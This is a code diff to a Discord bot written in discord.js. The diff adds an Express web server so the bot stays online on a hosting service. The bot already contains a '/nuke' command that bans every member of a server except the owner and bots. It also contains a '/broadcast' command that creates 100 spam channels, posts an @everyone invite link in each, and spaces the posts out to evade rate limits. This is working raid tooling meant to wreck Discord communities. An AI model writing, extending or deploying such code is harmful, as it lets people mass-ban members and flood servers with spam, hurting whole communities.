@@ -1,3 +1,4 @@
+const express = require('express');
 const { 
   Client, 
   GatewayIntentBits, 
@@ -10,6 +11,15 @@ const {
 } = require('discord.js');
 require('dotenv').config();
 
+// Initialize Express to satisfy Render's web service requirement
+const app = express();
+const PORT = process.env.PORT || 3000;
+app.get('/', (req, res) => {
+  res.send('Bot is online!');
+});
+app.listen(PORT, () => console.log(`Web server started on port ${PORT}`));
+
+// Initialize Discord Client
 const client = new Client({
   intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
   partials: [Partials.GuildMember],
@@ -38,15 +48,16 @@ client.once('ready', async () => {
     Routes.applicationGuildCommands(client.user.id, process.env.GUILD_ID),
     { body: commands }
   );
-
+  
   console.log('🚀 Slash commands registered');
 });
 
 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isChatInputCommand()) return;
-
+  
   const guild = interaction.guild;
 
+  // /nuke command: Bans all members except the OWNER and bots (after confirmation)
   if (interaction.commandName === 'nuke') {
     if (interaction.user.id !== process.env.OWNER_ID) {
       return interaction.reply({ content: '❌ You are not allowed to use this command.', ephemeral: true });
@@ -56,7 +67,7 @@ client.on('interactionCreate', async (interaction) => {
 
     const filter = m => m.author.id === interaction.user.id && m.content === 'CONFIRM';
     try {
-      const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] });
+      await interaction.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] });
       const members = await guild.members.fetch();
 
       for (const [id, member] of members) {
@@ -79,13 +90,13 @@ client.on('interactionCreate', async (interaction) => {
     }
   }
 
+  // /broadcast command: Creates 100 channels named vanir-1, vanir-2, etc. and sends @everyone with discord.gg/vanir in each
   if (interaction.commandName === 'broadcast') {
     if (interaction.user.id !== process.env.OWNER_ID) {
       return interaction.reply({ content: '❌ You are not allowed to use this command.', ephemeral: true });
     }
 
     await interaction.reply('🚧 Starting channel creation...');
-
     for (let i = 1; i <= 100; i++) {
       try {
         const channel = await guild.channels.create({
@@ -100,17 +111,17 @@ client.on('interactionCreate', async (interaction) => {
         });
 
         await channel.send({
-          content: `@everyone https://discord.gg/vanir`,
+          content: `@everyone\nhttps://discord.gg/vanir`,
           allowedMentions: { parse: ['everyone'] }
         });
 
         console.log(`✅ Created channel vanir-${i}`);
-        await new Promise(r => setTimeout(r, 500)); // Slight delay to reduce rate limit risk
+        // Slight delay to reduce hitting rate limits
+        await new Promise(r => setTimeout(r, 500)); 
       } catch (err) {
-        console.error(`❌ Failed to create or send in vanir-${i}: ${err.message}`);
+        console.error(`❌ Failed on vanir-${i}: ${err.message}`);
       }
     }
-
     interaction.followUp('✅ Broadcast complete.');
   }
 });
